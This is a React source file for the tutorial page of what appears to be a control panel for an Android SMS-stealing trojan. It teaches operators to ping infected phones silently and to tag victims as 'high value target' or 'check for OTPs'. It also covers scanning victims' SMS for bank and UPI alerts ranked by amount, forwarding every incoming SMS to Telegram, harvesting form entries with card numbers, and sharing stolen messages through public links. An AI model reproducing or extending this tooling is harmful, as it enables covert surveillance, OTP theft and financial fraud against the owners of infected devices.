import { useState, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { motion } from "framer-motion";
import {
  X, BookOpen, Wifi, WifiOff, StickyNote, Bell, Sparkles, ScanSearch,
  Link2, Send, FileText, Smartphone, BatteryMedium, Signal, Zap, Lock,
  Pin, Trash2, Eye, Copy, MessageSquare, ArrowDown, Phone, CreditCard,
  User, Download, Settings, Shield, Clock, ExternalLink
} from "lucide-react";

const SECTIONS = [
  { id: "device", label: "Device Card", icon: Smartphone },
  { id: "ping", label: "Ping", icon: Signal },
  { id: "notes", label: "Notes", icon: StickyNote },
  { id: "magic-clear", label: "Magic Clear", icon: Sparkles },
  { id: "magic-scan", label: "Magic Scan", icon: ScanSearch },
  { id: "links", label: "Links", icon: Link2 },
  { id: "sms-fwd", label: "SMS Forward", icon: Send },
  { id: "forms", label: "Forms", icon: FileText },
  { id: "security", label: "Security", icon: Shield },
];

const TutorialPage = () => {
  const navigate = useNavigate();
  const [activeSection, setActiveSection] = useState<string | null>(null);
  const sectionRefs = useRef<Record<string, HTMLDivElement | null>>({});

  const scrollTo = (id: string) => {
    setActiveSection(id);
    sectionRefs.current[id]?.scrollIntoView({ behavior: "smooth", block: "start" });
  };

  const cardAnim = {
    hidden: { opacity: 0, y: 20 },
    visible: (i: number) => ({ opacity: 1, y: 0, transition: { delay: i * 0.05, duration: 0.4 } }),
  };

  const Section = ({ id, icon: Icon, title, badge, index, children }: {
    id: string; icon: React.ElementType; title: string; badge?: string; index: number; children: React.ReactNode;
  }) => (
    <motion.div
      ref={(el) => { sectionRefs.current[id] = el; }}
      custom={index} variants={cardAnim} initial="hidden" animate="visible"
      className="rounded-2xl border border-border/60 bg-card/80 backdrop-blur-sm overflow-hidden scroll-mt-36"
    >
      {/* Section header with gradient line */}
      <div className="h-1 bg-gradient-to-r from-primary/40 via-primary/20 to-transparent" />
      <div className="p-5 space-y-4">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="h-10 w-10 rounded-xl bg-primary/10 border border-primary/15 flex items-center justify-center">
              <Icon className="h-5 w-5 text-primary" />
            </div>
            <div>
              <h3 className="text-[14px] font-bold text-foreground tracking-tight">{title}</h3>
              {badge && (
                <span className="text-[8px] font-bold text-primary uppercase tracking-[0.15em]">{badge}</span>
              )}
            </div>
          </div>
        </div>
        {children}
      </div>
    </motion.div>
  );

  const Tip = ({ text }: { text: string }) => (
    <div className="flex items-start gap-2.5 px-3.5 py-2.5 rounded-xl bg-primary/5 border border-primary/10">
      <Zap className="h-3.5 w-3.5 text-primary shrink-0 mt-0.5" />
      <p className="text-[10px] text-primary font-medium leading-relaxed">{text}</p>
    </div>
  );

  const StepFlow = ({ steps }: { steps: { emoji: string; text: string }[] }) => (
    <div className="rounded-xl bg-secondary/50 border border-border/50 p-3.5 space-y-0">
      {steps.map((s, i) => (
        <div key={i} className="flex items-start gap-3 relative">
          {i < steps.length - 1 && (
            <div className="absolute left-[13px] top-7 bottom-0 w-px bg-border/60" />
          )}
          <div className="h-7 w-7 rounded-lg bg-primary/10 flex items-center justify-center shrink-0 z-10">
            <span className="text-[11px]">{s.emoji}</span>
          </div>
          <p className="text-[11px] text-muted-foreground leading-relaxed pt-1 pb-3">{s.text}</p>
        </div>
      ))}
    </div>
  );

  const InfoRow = ({ icon: Icon, label, value, color = "text-primary" }: {
    icon: React.ElementType; label: string; value: string; color?: string;
  }) => (
    <div className="flex items-center gap-2.5 px-3 py-2 rounded-xl bg-secondary/40">
      <Icon className={`h-3.5 w-3.5 ${color} shrink-0`} />
      <span className="text-[10px] text-muted-foreground">{label}</span>
      <span className="text-[10px] text-foreground font-semibold ml-auto">{value}</span>
    </div>
  );

  return (
    <div className="min-h-screen bg-background pb-28">
      {/* Header */}
      <div className="sticky top-0 z-30 bg-background/80 backdrop-blur-xl">
        <div className="px-4 pt-5 pb-3">
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center gap-2.5">
              <div className="h-10 w-10 rounded-xl bg-primary flex items-center justify-center">
                <BookOpen className="h-5 w-5 text-primary-foreground" />
              </div>
              <div>
                <h1 className="text-lg font-extrabold text-foreground tracking-tight">Tutorial Guide</h1>
                <p className="text-[10px] text-muted-foreground">{SECTIONS.length} features explained in detail</p>
              </div>
            </div>
            <button
              onClick={() => navigate(-1)}
              className="h-9 w-9 rounded-xl bg-card border border-border flex items-center justify-center hover:bg-destructive/10 hover:text-destructive hover:border-destructive/30 transition-all"
            >
              <X className="h-4 w-4" />
            </button>
          </div>

          {/* Quick nav chips */}
          <div className="flex gap-1.5 overflow-x-auto pb-1 no-scrollbar">
            {SECTIONS.map((s) => (
              <button
                key={s.id}
                onClick={() => scrollTo(s.id)}
                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-[10px] font-semibold whitespace-nowrap transition-all shrink-0 ${
                  activeSection === s.id
                    ? "bg-primary text-primary-foreground"
                    : "bg-secondary/60 text-muted-foreground hover:text-foreground hover:bg-secondary"
                }`}
              >
                <s.icon className="h-3 w-3" />
                {s.label}
              </button>
            ))}
          </div>
        </div>
        <div className="h-px bg-gradient-to-r from-transparent via-primary/25 to-transparent" />
      </div>

      <div className="px-4 pt-4 space-y-4">

        {/* ── Device Card ── */}
        <Section id="device" icon={Smartphone} title="Device Card" badge="Core Feature" index={0}>
          {/* Sample device card */}
          <div className="rounded-2xl border border-primary/15 bg-gradient-to-br from-secondary/60 to-secondary/30 p-4 space-y-3">
            <div className="flex items-center gap-3">
              <div className="h-12 w-12 rounded-xl bg-primary/15 border border-primary/20 flex items-center justify-center">
                <span className="text-base font-black text-primary">SA</span>
              </div>
              <div className="flex-1 min-w-0">
                <div className="flex items-center gap-2">
                  <p className="text-[13px] font-bold text-foreground truncate">Samsung Galaxy A52</p>
                  <span className="relative flex h-2 w-2 shrink-0">
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green opacity-75" />
                    <span className="relative inline-flex rounded-full h-2 w-2 bg-green" />
                  </span>
                </div>
                <div className="flex items-center gap-3 mt-1">
                  <span className="text-[9px] text-muted-foreground flex items-center gap-1">
                    <Smartphone className="h-3 w-3" /> Android 13
                  </span>
                  <span className="text-[9px] text-muted-foreground flex items-center gap-1">
                    <BatteryMedium className="h-3 w-3 text-green" /> 72%
                  </span>
                  <span className="text-[9px] text-muted-foreground flex items-center gap-1">
                    <Clock className="h-3 w-3" /> 2m ago
                  </span>
                </div>
              </div>
            </div>
            <div className="flex gap-1.5 flex-wrap">
              <span className="px-2.5 py-1 rounded-lg bg-primary/10 border border-primary/15 text-[9px] font-semibold text-primary">SIM 1: Airtel</span>
              <span className="px-2.5 py-1 rounded-lg bg-primary/10 border border-primary/15 text-[9px] font-semibold text-primary">SIM 2: Jio</span>
            </div>
            {/* Sample action buttons */}
            <div className="flex gap-1.5">
              {[
                { icon: Eye, label: "View" },
                { icon: Pin, label: "Pin" },
                { icon: StickyNote, label: "Notes" },
                { icon: Link2, label: "Link" },
                { icon: Trash2, label: "Delete" },
              ].map(({ icon: Ic, label }) => (
                <div key={label} className="flex-1 flex flex-col items-center gap-1 py-2 rounded-xl bg-secondary/60 border border-border/40">
                  <Ic className="h-3.5 w-3.5 text-muted-foreground" />
                  <span className="text-[8px] text-muted-foreground font-medium">{label}</span>
                </div>
              ))}
            </div>
          </div>

          <div className="space-y-2.5">
            <p className="text-[11px] text-muted-foreground leading-relaxed">
              The device card is the heart of the panel. It shows the <span className="text-foreground font-semibold">brand avatar</span> (first 2 letters of model), device name, Android version, battery percentage, and dual SIM info.
            </p>
            <div className="space-y-1.5">
              <InfoRow icon={Smartphone} label="Avatar" value="First 2 letters of model" />
              <InfoRow icon={Wifi} label="Green dot" value="Device is online" color="text-green" />
              <InfoRow icon={WifiOff} label="Gray dot" value="Device is offline" color="text-muted-foreground" />
              <InfoRow icon={BatteryMedium} label="Battery" value="Live percentage" color="text-green" />
              <InfoRow icon={Pin} label="Pin" value="Anchors card to top" />
            </div>
            <Tip text="Tap a device card to open the full detail view — SMS inbox, forms, sent messages, call actions, and more." />
            <Tip text="Pinned devices always stay at the top with a special accent glow. Great for high-priority targets." />
          </div>
        </Section>

        {/* ── Ping ── */}
        <Section id="ping" icon={Signal} title="What is Ping?" badge="Connectivity Check" index={1}>
          <p className="text-[11px] text-muted-foreground leading-relaxed">
            <span className="text-foreground font-semibold">Ping</span> sends a silent <span className="text-foreground font-semibold">Firebase Cloud Messaging (FCM)</span> push to the device. It's invisible to the device user — no notification is shown. The response tells you if the app is still installed.
          </p>

          <div className="grid grid-cols-2 gap-2">
            <div className="rounded-xl bg-green/10 border border-green/20 p-3 text-center space-y-1.5">
              <div className="h-9 w-9 rounded-xl bg-green/15 flex items-center justify-center mx-auto">
                <Wifi className="h-4.5 w-4.5 text-green" />
              </div>
              <p className="text-[11px] font-bold text-green">✓ Active</p>
              <p className="text-[9px] text-muted-foreground leading-snug">App is installed & FCM token is valid</p>
            </div>
            <div className="rounded-xl bg-destructive/10 border border-destructive/20 p-3 text-center space-y-1.5">
              <div className="h-9 w-9 rounded-xl bg-destructive/15 flex items-center justify-center mx-auto">
                <WifiOff className="h-4.5 w-4.5 text-destructive" />
              </div>
              <p className="text-[11px] font-bold text-destructive">✗ Dead</p>
              <p className="text-[9px] text-muted-foreground leading-snug">UNREGISTERED error — app has been removed</p>
            </div>
          </div>

          <StepFlow steps={[
            { emoji: "📡", text: "Panel sends a silent FCM data message to the device's token" },
            { emoji: "📱", text: "Device receives it silently (no visible notification)" },
            { emoji: "✅", text: "If successful → device is alive. If UNREGISTERED → app was uninstalled" },
          ]} />

          <Tip text="Ping is the foundation of Magic Clear. You can also manually ping individual devices from their detail view." />
        </Section>

        {/* ── Notes ── */}
        <Section id="notes" icon={StickyNote} title="Device Notes" badge="Personal Tracking" index={2}>
          <p className="text-[11px] text-muted-foreground leading-relaxed">
            Attach <span className="text-foreground font-semibold">persistent notes</span> to any device. Notes are saved to Firebase and available across all your sessions. Use them to track device owners, important details, or reminders.
          </p>

          {/* Sample notes */}
          <div className="space-y-2">
            {[
              { note: "Owner: Rahul Sharma — HDFC credit card user, check for OTPs", color: "border-primary/15" },
              { note: "Business account — high value target, monitor daily", color: "border-yellow/20" },
            ].map((n, i) => (
              <div key={i} className={`rounded-xl bg-secondary/50 border ${n.color} p-3 flex items-start gap-2.5`}>
                <StickyNote className="h-3.5 w-3.5 text-primary shrink-0 mt-0.5" />
                <p className="text-[10px] text-muted-foreground italic leading-relaxed">"{n.note}"</p>
              </div>
            ))}
          </div>

          <Tip text="Tap the notes icon on any device card → type your note → hit Save. It persists forever until you change it." />
        </Section>

        {/* ── Magic Clear ── */}
        <Section id="magic-clear" icon={Sparkles} title="Magic Clear" badge="Auto Cleanup" index={3}>
          <p className="text-[11px] text-muted-foreground leading-relaxed">
            <span className="text-foreground font-semibold">Magic Clear</span> is your automated janitor. It pings every connected device, identifies ones where the app was uninstalled, and performs a <span className="text-destructive font-semibold">cascade deletion</span> of all their data.
          </p>

          <StepFlow steps={[
            { emoji: "🔍", text: "Scans all connected devices by sending FCM pings" },
            { emoji: "💀", text: "Identifies dead devices (UNREGISTERED FCM responses)" },
            { emoji: "🗑️", text: "Cascade deletes: SMS logs, sent messages, call records, forms, and notes" },
            { emoji: "✨", text: "Your panel is clean — only active devices remain" },
          ]} />

          <div className="grid grid-cols-2 gap-2">
            <div className="rounded-xl bg-secondary/50 border border-border/50 p-3 text-center">
              <p className="text-lg font-black text-foreground">4h</p>
              <p className="text-[9px] text-muted-foreground">Cooldown period</p>
            </div>
            <div className="rounded-xl bg-secondary/50 border border-border/50 p-3 text-center">
              <p className="text-lg font-black text-destructive">6</p>
              <p className="text-[9px] text-muted-foreground">Data paths deleted</p>
            </div>
          </div>

          <Tip text="Use Magic Clear regularly to keep your panel fast and clutter-free. The 4-hour cooldown is synced via Firebase." />
        </Section>

        {/* ── Magic Scan ── */}
        <Section id="magic-scan" icon={ScanSearch} title="Magic Scan" badge="Smart Discovery" index={4}>
          <p className="text-[11px] text-muted-foreground leading-relaxed">
            <span className="text-foreground font-semibold">Magic Scan</span> searches SMS across all <span className="text-green font-semibold">online devices</span> for financial messages — bank alerts, UPI transactions, credit card notifications. It extracts amounts and ranks by <span className="text-foreground font-semibold">highest value</span>.
          </p>

          {/* Sample scan results */}
          <div className="rounded-xl bg-secondary/50 border border-border/50 overflow-hidden">
            <div className="px-3 py-2 bg-primary/5 border-b border-border/40">
              <p className="text-[9px] font-bold text-primary uppercase tracking-widest">Scan Results — Sample</p>
            </div>
            {[
              { amount: "₹1,45,000", bank: "HDFC Bank credit alert", device: "Samsung A52" },
              { amount: "₹45,000", bank: "SBI UPI transaction", device: "Xiaomi 11T" },
              { amount: "₹12,500", bank: "ICICI Card payment", device: "Oppo F21" },
              { amount: "₹3,200", bank: "Paytm wallet credit", device: "Vivo Y20" },
            ].map((r, i) => (
              <div key={i} className={`flex items-center justify-between px-3 py-2.5 ${i < 3 ? "border-b border-border/30" : ""}`}>
                <div className="flex items-center gap-2.5">
                  <span className="text-[12px] font-black text-foreground min-w-[70px]">{r.amount}</span>
                  <span className="text-[9px] text-muted-foreground">{r.bank}</span>
                </div>
                <span className="text-[9px] text-primary font-semibold">{r.device}</span>
              </div>
            ))}
          </div>

          <div className="grid grid-cols-2 gap-2">
            <div className="rounded-xl bg-secondary/50 border border-border/50 p-3 text-center">
              <p className="text-lg font-black text-foreground">10m</p>
              <p className="text-[9px] text-muted-foreground">Cooldown period</p>
            </div>
            <div className="rounded-xl bg-secondary/50 border border-border/50 p-3 text-center">
              <p className="text-lg font-black text-primary">∞</p>
              <p className="text-[9px] text-muted-foreground">Cached locally</p>
            </div>
          </div>

          <Tip text="Scan results are cached in localStorage for instant access. Tap 'Open Device' on any result to jump straight to that device." />
        </Section>

        {/* ── Device Links ── */}
        <Section id="links" icon={Link2} title="Shareable Device Links" badge="Public Access" index={5}>
          <p className="text-[11px] text-muted-foreground leading-relaxed">
            Generate <span className="text-foreground font-semibold">public read-only links</span> for any device. Share them with anyone — they can view the device's SMS without logging in. Perfect for sharing access without giving panel credentials.
          </p>

          {/* Sample link */}
          <div className="rounded-xl bg-secondary/50 border border-border/50 p-3 space-y-2">
            <div className="flex items-center gap-2">
              <Link2 className="h-3.5 w-3.5 text-primary shrink-0" />
              <p className="text-[10px] font-mono text-foreground truncate">panel.app/view/abc123def...</p>
            </div>
            <div className="flex gap-1.5">
              <span className="px-2 py-1 rounded-lg bg-green/10 text-[9px] font-semibold text-green">Active</span>
              <span className="px-2 py-1 rounded-lg bg-secondary text-[9px] font-semibold text-muted-foreground">Read-only</span>
              <span className="px-2 py-1 rounded-lg bg-secondary text-[9px] font-semibold text-muted-foreground">No login required</span>
            </div>
          </div>

          <StepFlow steps={[
            { emoji: "🔗", text: "Open a device → tap 'Create Link' to generate a shareable URL" },
            { emoji: "📤", text: "Share the link — recipient sees SMS in read-only mode" },
            { emoji: "🔒", text: "Revoke anytime from Manage Links in the drawer" },
          ]} />

          <Tip text="Links use a separate Firebase auth instance so they never interfere with your main admin session." />
        </Section>

        {/* ── SMS Forwarding ── */}
        <Section id="sms-fwd" icon={Send} title="SMS Forwarding to Telegram" badge="Real-time Alerts" index={6}>
          <p className="text-[11px] text-muted-foreground leading-relaxed">
            When enabled, <span className="text-foreground font-semibold">every incoming SMS</span> on any connected device is instantly forwarded to your Telegram bot. This uses a <span className="text-foreground font-semibold">separate bot</span> from the main panel bot for better organization.
          </p>

          <StepFlow steps={[
            { emoji: "📱", text: "New SMS arrives on any connected device" },
            { emoji: "⚡", text: "Device app sends it to Firebase in real-time" },
            { emoji: "🤖", text: "SMS Bot forwards the message to your Telegram chat" },
            { emoji: "📬", text: "You get notified instantly — sender, body, device info" },
          ]} />

          <Tip text="Go to Settings → Security & Features → Enable 'Forward SMS to Telegram' and configure the separate SMS bot credentials." />
        </Section>

        {/* ── Forms ── */}
        <Section id="forms" icon={FileText} title="Forms & Data Capture" badge="Auto Collection" index={7}>
          <p className="text-[11px] text-muted-foreground leading-relaxed">
            Devices automatically capture <span className="text-foreground font-semibold">form submissions</span> — names, phone numbers, IDs, card details, and more. All entries are aggregated in the <span className="text-foreground font-semibold">All Forms</span> overlay.
          </p>

          {/* Sample form entry */}
          <div className="rounded-xl bg-secondary/50 border border-border/50 p-3 space-y-2">
            <div className="flex items-center justify-between">
              <span className="text-[9px] font-mono px-2 py-0.5 rounded-md bg-primary/10 text-primary font-semibold">Samsung A52</span>
              <span className="text-[9px] text-muted-foreground">Mar 15, 14:23</span>
            </div>
            <div className="space-y-1.5">
              {[
                { icon: User, field: "Full Name", value: "Rahul Sharma" },
                { icon: Phone, field: "Mobile", value: "+91 98765 43210" },
                { icon: CreditCard, field: "Card No", value: "•••• •••• •••• 4521" },
              ].map(({ icon: Ic, field, value }) => (
                <div key={field} className="flex items-center gap-2">
                  <Ic className="h-3 w-3 text-primary shrink-0" />
                  <span className="text-[9px] text-muted-foreground min-w-[55px]">{field}</span>
                  <span className="text-[10px] text-foreground font-mono">{value}</span>
                </div>
              ))}
            </div>
          </div>

          <div className="flex gap-2">
            {[
              { icon: Eye, label: "View all fields" },
              { icon: Copy, label: "Copy to clipboard" },
              { icon: Trash2, label: "Delete entry" },
            ].map(({ icon: Ic, label }) => (
              <div key={label} className="flex-1 rounded-xl bg-secondary/40 border border-border/40 p-2.5 flex flex-col items-center gap-1">
                <Ic className="h-3.5 w-3.5 text-muted-foreground" />
                <span className="text-[8px] text-muted-foreground text-center">{label}</span>
              </div>
            ))}
          </div>

          <Tip text="Forms are auto-tagged with icons based on field names — names get a person icon, phones get a phone icon, etc." />
        </Section>

        {/* ── Security ── */}
        <Section id="security" icon={Shield} title="2FA & Security" badge="Protection Layer" index={8}>
          <p className="text-[11px] text-muted-foreground leading-relaxed">
            The panel supports multiple layers of security to protect your data and prevent unauthorized actions.
          </p>

          <div className="space-y-2">
            {[
              { icon: Lock, title: "2FA OTP on Login", desc: "Requires a Telegram OTP code every time you log in to the panel", color: "text-primary" },
              { icon: Shield, title: "2FA OTP on Delete", desc: "Requires OTP before deleting any device, SMS, form, or critical data", color: "text-destructive" },
              { icon: Send, title: "SMS Forwarding", desc: "Forward all incoming SMS to a dedicated Telegram bot in real-time", color: "text-green" },
              { icon: Settings, title: "Secret Key Guard", desc: "Changing Telegram bot settings requires a secret key + connectivity test", color: "text-[hsl(var(--orange))]" },
            ].map(({ icon: Ic, title, desc, color }) => (
              <div key={title} className="flex items-start gap-3 rounded-xl bg-secondary/40 border border-border/40 p-3">
                <div className="h-8 w-8 rounded-lg bg-secondary flex items-center justify-center shrink-0 mt-0.5">
                  <Ic className={`h-4 w-4 ${color}`} />
                </div>
                <div>
                  <p className="text-[11px] font-semibold text-foreground">{title}</p>
                  <p className="text-[9px] text-muted-foreground leading-relaxed mt-0.5">{desc}</p>
                </div>
              </div>
            ))}
          </div>

          <Tip text="All security toggles can be configured independently from Settings → Security & Features." />
        </Section>

        {/* Footer */}
        <div className="text-center py-6 space-y-2">
          <p className="text-[10px] text-muted-foreground">That's everything! You're now a panel pro 🎯</p>
          <button
            onClick={() => navigate("/")}
            className="inline-flex items-center gap-2 px-5 py-2.5 rounded-xl bg-primary text-primary-foreground text-xs font-bold hover:opacity-90 transition-opacity"
          >
            <Smartphone className="h-3.5 w-3.5" />
            Go to Dashboard
          </button>
        </div>

      </div>
    </div>
  );
};

export default TutorialPage;
